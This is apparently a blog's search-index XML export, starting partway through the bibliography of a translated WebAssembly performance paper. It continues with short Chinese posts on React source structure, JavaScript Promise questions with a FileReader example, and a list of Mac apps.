<p>[16]: Eric  Elliott.What  is  WebAssembly?<a href="https://tinyurl.com/o5h6daj">https://tinyurl.com/o5h6daj</a>, 2015.    [Online;  accessed 5-January-2019].</p>
<p>[17]: Andreas Gal, Brendan Eich, Mike Shaver, David An-derson,  David Mandelin,  Mohammad R.  Haghighat,Blake Kaplan, Graydon Hoare, Boris Zbarsky, JasonOrendorff, Jesse Ruderman, Edwin W. Smith, Rick Re-itmaier, Michael Bebenita, Mason Chang, and MichaelFranz.   Trace-based Just-in-time Type Specializationfor Dynamic Languages.   InProceedings of the 30thACM SIGPLAN Conference on Programming LanguageDesign and Implementation, PLDI ’09, pages 465–478.ACM, 2009.</p>
<p>[18]: Andreas Haas,  Andreas Rossberg,  Derek L.   Schuff,Ben L.  Titzer, Michael Holman, Dan Gohman, LukeWagner, Alon Zakai, and JF Bastien.  Bringing the WebUp to Speed with WebAssembly.  InProceedings of the38th ACM SIGPLAN Conference on Programming Lan-guage Design and Implementation, PLDI 2017, pages185–200. ACM, 2017.</p>
<p>[19]: Thomas  Kotzmann,   Christian  Wimmer,   HanspeterMössenböck, Thomas Rodriguez, Kenneth Russell, andDavid Cox.   Design of the Java HotSpot Client Com-piler for Java 6.ACM Trans.  Archit.  Code Optim.,5(1):7:1–7:32, 2008.</p>
<p>[20]: Ankur Limaye and Tosiron Adegbija.  A Workload Char-acterization of the SPEC CPU2017 Benchmark Suite.In2018 IEEE International Symposium on PerformanceAnalysis of Systems and Software (ISPASS), pages 149–158, 2018.</p>
<p>[21]: Tim Lindholm, Frank Yellin, Gilad Bracha, and AlexBuckley.The Java Virtual Machine Specification, JavaSE 8 Edition.  Addison-Wesley Professional, 1st edition,2014.USENIX Association2019 USENIX Annual Technical Conference    119</p>
<p>[22]: Greg  Morrisett,  Gang  Tan,  Joseph  Tassarotti,  Jean-Baptiste Tristan, and Edward Gan.   RockSalt:  Better,Faster, Stronger SFI for the x86.    InProceedings ofthe 33rd ACM SIGPLAN Conference on ProgrammingLanguage Design and Implementation, PLDI ’12, pages395–404. ACM, 2012.</p>
<p>[23]: Greg Morrisett,  David Walker,  Karl Crary,  and NealGlew.  From System F to Typed Assembly Language.ACM Trans.   Program.   Lang.   Syst.,  21(3):527–568,1999.</p>
<p>[24]: Richard Musiol.    A compiler from Go to JavaScriptfor running Go code in a browser.<a href="https://github.com/gopherjs/gopherjs">https://github.com/gopherjs/gopherjs</a>, 2016.    [Online;  accessed5-January-2019].</p>
<p>[25]: George C. Necula, Scott McPeak, Shree P. Rahul, andWestley Weimer.CIL:  Intermediate Language andTools for Analysis and Transformation of C Programs.In R. Nigel Horspool, editor,Compiler Construction,pages 213–228. Springer, 2002.</p>
<p>[26]: Reena Panda, Shuang Song, Joseph Dean, and Lizy K.John.  Wait of a Decade: Did SPEC CPU 2017 Broadenthe Performance Horizon?  In2018 IEEE InternationalSymposium on High Performance Computer Architec-ture (HPCA), pages 271–282, 2018.</p>
<p>[27]: Aashish  Phansalkar,  Ajay  Joshi,  and  Lizy  K.   John.Analysis of Redundancy and Application Balance inthe SPEC CPU2006 Benchmark Suite.  InProceedingsof the 34th Annual International Symposium on Com-puter Architecture, ISCA ’07, pages 412–423.  ACM,2007.</p>
<p>[28]: Bobby  Powers,  John  Vilk,  and  Emery  D.Berger.Browsix: Unix in your browser tab.<a href="https://browsix.org/">https://browsix.org</a>.</p>
<p>[29]: Bobby  Powers,  John  Vilk,  and  Emery  D.Berger.Browsix:   Bridging  the  Gap  Between  Unix  and  theBrowser.  InProceedings of the Twenty-Second Inter-national Conference on Architectural Support for Pro-gramming Languages and Operating Systems, ASPLOS’17, pages 253–266. ACM, 2017.</p>
<p>[30]: Gregor Richards, Sylvain Lebresne, Brian Burg, andJan Vitek.   An Analysis of the Dynamic Behavior ofJavaScript Programs.  InProceedings of the 31st ACMSIGPLAN Conference on Programming Language De-sign and Implementation, PLDI ’10, pages 1–12. ACM,2010.</p>
<p>[31]: Marija Selakovic and Michael Pradel.    PerformanceIssues and Optimizations in JavaScript: An EmpiricalStudy.  InProceedings of the 38th International Confer-ence on Software Engineering, ICSE ’16, pages 61–72.ACM, 2016.</p>
<p>[32]: Toshio Suganuma, Toshiaki Yasue, Motohiro Kawahito,Hideaki Komatsu, and Toshio Nakatani. A Dynamic Op-timization Framework for a Java Just-in-time Compiler.InProceedings of the 16th ACM SIGPLAN Conferenceon Object-oriented Programming, Systems, Languages,and Applications, OOPSLA ’01, pages 180–195. ACM,2001.</p>
<p>[33]: Luke Wagner. asm.js in Firefox Nightly | Luke Wagner’sBlog.<a href="https://blog.mozilla.org/luke/2013/03/21/asm-js-in-firefox-nightly/.[Online">https://blog.mozilla.org/luke/2013/03/21/asm-js-in-firefox-nightly/.[Online</a>;  ac-cessed 21-May-2019].</p>
<p>[34]: Luke   Wagner.A   WebAssembly   Milestone:ExperimentalSupportinMultipleBrowsers.<a href="https://hacks.mozilla.org/2016/03/a-webassembly-milestone/">https://hacks.mozilla.org/2016/03/a-webassembly-milestone/</a>,   2016.[Online;accessed 5-January-2019].</p>
<p>[35]: Conrad Watt.Mechanising and Verifying the Web-Assembly Specification.InProceedings  of the  7thACM SIGPLAN International Conference on CertifiedPrograms and Proofs, CPP 2018, pages 53–65. ACM,2018.</p>
<p>[36]: Christian Wimmer and Michael Franz.    Linear ScanRegister Allocation on SSA Form.  InProceedings ofthe 8th Annual IEEE/ACM International Symposium onCode Generation and Optimization, CGO ’10, pages170–179. ACM, 2010.</p>
<p>[37]: Bennet  Yee,  David  Sehr,  Greg  Dardyk,  Brad  Chen,Robert Muth,  Tavis  Ormandy,  Shiki  Okasaka,  NehaNarula, and Nicholas Fullagar.  Native Client: A Sand-box  for  Portable,  Untrusted  x86  Native  Code.InIEEE Symposium on Security and Privacy (Oakland’09),IEEE, 2009.</p>
<p>[38]: Alon Zakai.   asm.js.<a href="http://asmjs.org/">http://asmjs.org/</a>.   [Online;accessed 5-January-2019].</p>
<p>[39]:  Alon Zakai.  Emscripten: An LLVM-to-JavaScript Com-piler.   InProceedings of the ACM International Con-ference Companion on Object Oriented ProgrammingSystems Languages and Applications Companion, OOP-SLA ’11, pages 301–312. ACM, 2011.</p>
]]></content>
      <tags>
        <tag>翻译</tag>
      </tags>
  </entry>
  <entry>
    <title>react源码</title>
    <url>/2021/02/28/react-source-code-1/</url>
    <content><![CDATA[<h2 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h2><p>├── create-subscription<br>├── dom-event-testing-library<br>├── eslint-plugin-react-hooks<br>├── jest-mock-scheduler<br>├── jest-react<br>├── react<br>├── react-art<br>├── react-cache<br>├── react-client<br>├── react-debug-tools<br>├── react-devtools<br>├── react-devtools-core<br>├── react-devtools-extensions<br>├── react-devtools-inline<br>├── react-devtools-scheduling-profiler<br>├── react-devtools-shared<br>├── react-devtools-shell<br>├── react-dom<br>├── react-fetch<br>├── react-fs<br>├── react-interactions<br>├── react-is<br>├── react-native-renderer<br>├── react-noop-renderer<br>├── react-pg<br>├── react-reconciler<br>├── react-refresh<br>├── react-server<br>├── react-server-dom-relay<br>├── react-server-dom-webpack<br>├── react-server-native-relay<br>├── react-suspense-test-utils<br>├── react-test-renderer<br>├── scheduler<br>├── shared<br>└── use-subscription</p>
<p>整体代码是通过一种monorepo的方式组合.接下来,就一个一个来吧</p>
]]></content>
  </entry>
  <entry>
    <title>可爱的算法-系列1-树</title>
    <url>/2021/02/08/lovely-algo-1-tree/</url>
    <content><![CDATA[<h1 id="Abastract"><a href="#Abastract" class="headerlink" title="Abastract"></a>Abastract</h1><p>算法刷多了, 还是基础总重要.</p>
<p>从树开始, 记录一些基础的算法.以便日后查缺补漏.</p>
]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>react源码2-react模块</title>
    <url>/2021/02/28/react-source-code-2-react/</url>
    <content><![CDATA[<h1 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./packages/react/src</span><br><span class="line">├── BadMapPolyfill.js</span><br><span class="line">├── IsSomeRendererActing.js</span><br><span class="line">├── React.js <span class="comment"># 入口文件</span></span><br><span class="line">├── ReactBaseClasses.js</span><br><span class="line">├── ReactChildren.js</span><br><span class="line">├── ReactContext.js</span><br><span class="line">├── ReactCreateRef.js</span><br><span class="line">├── ReactCurrentBatchConfig.js</span><br><span class="line">├── ReactCurrentDispatcher.js</span><br><span class="line">├── ReactCurrentOwner.js</span><br><span class="line">├── ReactDebugCurrentFrame.js</span><br><span class="line">├── ReactElement.js</span><br><span class="line">├── ReactElementValidator.js</span><br><span class="line">├── ReactForwardRef.js</span><br><span class="line">├── ReactHooks.js <span class="comment"># hooks的实现</span></span><br><span class="line">├── ReactLazy.js</span><br><span class="line">├── ReactMemo.js</span><br><span class="line">├── ReactMutableSource.js</span><br><span class="line">├── ReactNoopUpdateQueue.js</span><br><span class="line">├── ReactSharedInternals.js</span><br><span class="line">├── ReactStartTransition.js</span><br><span class="line">├── __tests__</span><br><span class="line">├── forks</span><br><span class="line">└── jsx</span><br></pre></td></tr></table></figure>

<h2 id="ReactChildren"><a href="#ReactChildren" class="headerlink" title="ReactChildren"></a>ReactChildren</h2><p>提供React.Children的一些方法</p>
<h2 id="ReactBaseClasses"><a href="#ReactBaseClasses" class="headerlink" title="ReactBaseClasses"></a>ReactBaseClasses</h2><p>提供Component和PureComponent</p>
<p>依赖</p>
<h3 id="ReactNoopUpdateQueue"><a href="#ReactNoopUpdateQueue" class="headerlink" title="ReactNoopUpdateQueue"></a>ReactNoopUpdateQueue</h3><h2 id="ReactHooks"><a href="#ReactHooks" class="headerlink" title="ReactHooks"></a>ReactHooks</h2><p>用户的api, useState, useEffect,等等.所有这些方法都是定义在ReactCurrentDispatcher.</p>
<h3 id="ReactCurrentDispatcher"><a href="#ReactCurrentDispatcher" class="headerlink" title="ReactCurrentDispatcher"></a>ReactCurrentDispatcher</h3><h4 id="react-reconciler-src-ReactInternalTypes"><a href="#react-reconciler-src-ReactInternalTypes" class="headerlink" title="react-reconciler/src/ReactInternalTypes"></a>react-reconciler/src/ReactInternalTypes</h4><p>  Dispatcher 定义了一堆hooks的方法</p>
]]></content>
  </entry>
  <entry>
    <title>promise 20问</title>
    <url>/2021/02/08/20-promise-questions/</url>
    <content><![CDATA[<h1 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h1><p>强行收集了20个promise的问题.</p>
<p>promise是一种异步的解决方案, 所有问题都是围绕异步展开的.而异步不外乎是: 创建, 执行, 结束.</p>
<h2 id="创建的问题"><a href="#创建的问题" class="headerlink" title="创建的问题"></a>创建的问题</h2><h3 id="手写一个promise"><a href="#手写一个promise" class="headerlink" title="手写一个promise"></a>手写一个promise</h3><p>原理: 一开始new Promise, 都是pending状态, 每一个then, 都是push一下callback, 然后new一个新的Promise; 当变成resole, 执行callback数组里面的回调, 顺便执行将新的promise的状态变成resole. 这就是链式调用. </p>
<h3 id="为什么then里面都是返回一个新的Promise呢-只有一个可以吗"><a href="#为什么then里面都是返回一个新的Promise呢-只有一个可以吗" class="headerlink" title="为什么then里面都是返回一个新的Promise呢? 只有一个可以吗?"></a>为什么then里面都是返回一个新的Promise呢? 只有一个可以吗?</h3><h3 id="实现Promise-any"><a href="#实现Promise-any" class="headerlink" title="实现Promise.any"></a>实现Promise.any</h3><p>有任何一个成功, 就返回成功; 否则全部失败,就返回一个 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/AggregateError">AggregateError</a></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="实现Promise-race"><a href="#实现Promise-race" class="headerlink" title="实现Promise.race"></a>实现Promise.race</h3><h3 id="如何将callback包装成promise"><a href="#如何将callback包装成promise" class="headerlink" title="如何将callback包装成promise"></a>如何将callback包装成promise</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 将图片转换为base64</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBase64</span>(<span class="params">file</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resole, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> fr = <span class="keyword">new</span> FileReader();</span><br><span class="line">    fr.readAsDataURL(file);</span><br><span class="line">    fr.onload = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      resole(fr.result);</span><br><span class="line">    &#125;</span><br><span class="line">		fr.onerror = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">			reject(fr.error)</span><br><span class="line">		&#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="执行的问题"><a href="#执行的问题" class="headerlink" title="执行的问题"></a>执行的问题</h2><h3 id="promise和Settimeout"><a href="#promise和Settimeout" class="headerlink" title="promise和Settimeout"></a>promise和Settimeout</h3><p>这是关于执行顺序的问题</p>
<h3 id="最大并发数"><a href="#最大并发数" class="headerlink" title="最大并发数"></a>最大并发数</h3><h3 id="取消执行"><a href="#取消执行" class="headerlink" title="取消执行"></a>取消执行</h3><h3 id="如何在then中reject"><a href="#如何在then中reject" class="headerlink" title="如何在then中reject"></a>如何在then中reject</h3><h3 id="超时取消执行"><a href="#超时取消执行" class="headerlink" title="超时取消执行"></a>超时取消执行</h3><h2 id="结束的问题"><a href="#结束的问题" class="headerlink" title="结束的问题"></a>结束的问题</h2><h3 id="catch和reject的区别"><a href="#catch和reject的区别" class="headerlink" title="catch和reject的区别"></a>catch和reject的区别</h3><p>异常捕获</p>
<h2 id="多个异步链式调用"><a href="#多个异步链式调用" class="headerlink" title="多个异步链式调用"></a>多个异步链式调用</h2><h2 id="多个异步并发"><a href="#多个异步并发" class="headerlink" title="多个异步并发"></a>多个异步并发</h2><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>手写: <a href="https://juejin.cn/post/6945319439772434469#heading-31">https://juejin.cn/post/6945319439772434469#heading-31</a></li>
</ul>
]]></content>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>react-source-code-3-react-reconciler</title>
    <url>/2021/03/01/react-source-code-3-react-reconciler/</url>
    <content><![CDATA[<h1 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./packages/react-reconciler/src</span><br><span class="line">├── DebugTracing.js</span><br><span class="line">├── MaxInts.js</span><br><span class="line">├── ReactCapturedValue.js</span><br><span class="line">├── ReactChildFiber.new.js</span><br><span class="line">├── ReactChildFiber.old.js</span><br><span class="line">├── ReactCurrentFiber.js</span><br><span class="line">├── ReactFiber.new.js</span><br><span class="line">├── ReactFiber.old.js</span><br><span class="line">├── ReactFiberBeginWork.new.js</span><br><span class="line">├── ReactFiberBeginWork.old.js</span><br><span class="line">├── ReactFiberCacheComponent.new.js</span><br><span class="line">├── ReactFiberCacheComponent.old.js</span><br><span class="line">├── ReactFiberClassComponent.new.js</span><br><span class="line">├── ReactFiberClassComponent.old.js</span><br><span class="line">├── ReactFiberCommitWork.new.js</span><br><span class="line">├── ReactFiberCommitWork.old.js</span><br><span class="line">├── ReactFiberCompleteWork.new.js</span><br><span class="line">├── ReactFiberCompleteWork.old.js</span><br><span class="line">├── ReactFiberComponentStack.js</span><br><span class="line">├── ReactFiberContext.new.js</span><br><span class="line">├── ReactFiberContext.old.js</span><br><span class="line">├── ReactFiberDevToolsHook.new.js</span><br><span class="line">├── ReactFiberDevToolsHook.old.js</span><br><span class="line">├── ReactFiberErrorDialog.js</span><br><span class="line">├── ReactFiberErrorLogger.js</span><br><span class="line">├── ReactFiberFlags.js</span><br><span class="line">├── ReactFiberHooks.new.js <span class="comment"># </span></span><br><span class="line">├── ReactFiberHooks.old.js</span><br><span class="line">├── ReactFiberHostConfig.js</span><br><span class="line">├── ReactFiberHostConfigWithNoHydration.js</span><br><span class="line">├── ReactFiberHostConfigWithNoMicrotasks.js</span><br><span class="line">├── ReactFiberHostConfigWithNoMutation.js</span><br><span class="line">├── ReactFiberHostConfigWithNoPersistence.js</span><br><span class="line">├── ReactFiberHostConfigWithNoScopes.js</span><br><span class="line">├── ReactFiberHostConfigWithNoTestSelectors.js</span><br><span class="line">├── ReactFiberHostContext.new.js</span><br><span class="line">├── ReactFiberHostContext.old.js</span><br><span class="line">├── ReactFiberHotReloading.js</span><br><span class="line">├── ReactFiberHotReloading.new.js</span><br><span class="line">├── ReactFiberHotReloading.old.js</span><br><span class="line">├── ReactFiberHydrationContext.new.js</span><br><span class="line">├── ReactFiberHydrationContext.old.js</span><br><span class="line">├── ReactFiberInterleavedUpdates.new.js</span><br><span class="line">├── ReactFiberInterleavedUpdates.old.js</span><br><span class="line">├── ReactFiberLane.new.js</span><br><span class="line">├── ReactFiberLane.old.js</span><br><span class="line">├── ReactFiberLazyComponent.new.js</span><br><span class="line">├── ReactFiberLazyComponent.old.js</span><br><span class="line">├── ReactFiberNewContext.new.js</span><br><span class="line">├── ReactFiberNewContext.old.js</span><br><span class="line">├── ReactFiberOffscreenComponent.js</span><br><span class="line">├── ReactFiberReconciler.js</span><br><span class="line">├── ReactFiberReconciler.new.js</span><br><span class="line">├── ReactFiberReconciler.old.js</span><br><span class="line">├── ReactFiberRoot.new.js</span><br><span class="line">├── ReactFiberRoot.old.js</span><br><span class="line">├── ReactFiberScope.new.js</span><br><span class="line">├── ReactFiberScope.old.js</span><br><span class="line">├── ReactFiberStack.new.js</span><br><span class="line">├── ReactFiberStack.old.js</span><br><span class="line">├── ReactFiberSuspenseComponent.new.js</span><br><span class="line">├── ReactFiberSuspenseComponent.old.js</span><br><span class="line">├── ReactFiberSuspenseContext.new.js</span><br><span class="line">├── ReactFiberSuspenseContext.old.js</span><br><span class="line">├── ReactFiberThrow.new.js</span><br><span class="line">├── ReactFiberThrow.old.js</span><br><span class="line">├── ReactFiberTransition.js</span><br><span class="line">├── ReactFiberTreeReflection.js</span><br><span class="line">├── ReactFiberUnwindWork.new.js</span><br><span class="line">├── ReactFiberUnwindWork.old.js</span><br><span class="line">├── ReactFiberWorkLoop.new.js</span><br><span class="line">├── ReactFiberWorkLoop.old.js</span><br><span class="line">├── ReactHookEffectTags.js</span><br><span class="line">├── ReactInternalTypes.js</span><br><span class="line">├── ReactMutableSource.new.js</span><br><span class="line">├── ReactMutableSource.old.js</span><br><span class="line">├── ReactPortal.js</span><br><span class="line">├── ReactProfilerTimer.new.js</span><br><span class="line">├── ReactProfilerTimer.old.js</span><br><span class="line">├── ReactRootTags.js</span><br><span class="line">├── ReactStrictModeWarnings.new.js</span><br><span class="line">├── ReactStrictModeWarnings.old.js</span><br><span class="line">├── ReactTestSelectors.js</span><br><span class="line">├── ReactTypeOfMode.js</span><br><span class="line">├── ReactUpdateQueue.new.js</span><br><span class="line">├── ReactUpdateQueue.old.js</span><br><span class="line">├── ReactWorkTags.js</span><br><span class="line">├── SchedulerWithReactIntegration.new.js</span><br><span class="line">├── SchedulerWithReactIntegration.old.js</span><br><span class="line">├── SchedulingProfiler.js</span><br><span class="line">├── __tests__</span><br><span class="line">└── forks</span><br></pre></td></tr></table></figure>

<h2 id="这么多-new-和-old-是干什么用的"><a href="#这么多-new-和-old-是干什么用的" class="headerlink" title="这么多 new 和 old 是干什么用的"></a>这么多 new 和 old 是干什么用的</h2><h2 id="ReactFiberHooks-new"><a href="#ReactFiberHooks-new" class="headerlink" title="ReactFiberHooks.new"></a>ReactFiberHooks.new</h2><p>这里定义了具体的hooks的逻辑</p>
<p>line: 2186: hooks会在三个阶段调用, mount, update, rerender</p>
<blockquote>
<p>为啥没有unMount阶段呢</p>
</blockquote>
<p>以mount中的useState为例, 调用了mountState(initialState), </p>
]]></content>
  </entry>
  <entry>
    <title>mapbox-gl-源码赏析-1-map</title>
    <url>/2021/03/11/mapbox-gl-source-code-1/</url>
    <content><![CDATA[]]></content>
      <tags>
        <tag>source-code</tag>
      </tags>
  </entry>
  <entry>
    <title>mac上常用的app</title>
    <url>/2021/04/28/mac-app/</url>
    <content><![CDATA[<h2 id="必须装"><a href="#必须装" class="headerlink" title="必须装"></a>必须装</h2><ul>
<li>alfred</li>
<li>clashx</li>
<li>contexts</li>
</ul>
<h2 id="coding"><a href="#coding" class="headerlink" title="coding"></a>coding</h2><ul>
<li>git</li>
<li>homebrew</li>
<li>vscode</li>
<li>sourcetree</li>
<li>iterm2</li>
<li>postman</li>
</ul>
<h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><ul>
<li>chrome</li>
<li>chrome canary</li>
<li>firefox</li>
<li>edge</li>
</ul>
<h2 id="小工具"><a href="#小工具" class="headerlink" title="小工具"></a>小工具</h2><ul>
<li>hide bar </li>
<li>截图</li>
<li>pap.er</li>
<li>notion</li>
<li>onenote</li>
<li>cleanmymac</li>
<li>rectagle</li>
<li>free download manager</li>
<li>wechat</li>
<li>hazeover</li>
<li>iina</li>
<li>maczip</li>
</ul>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
</search>
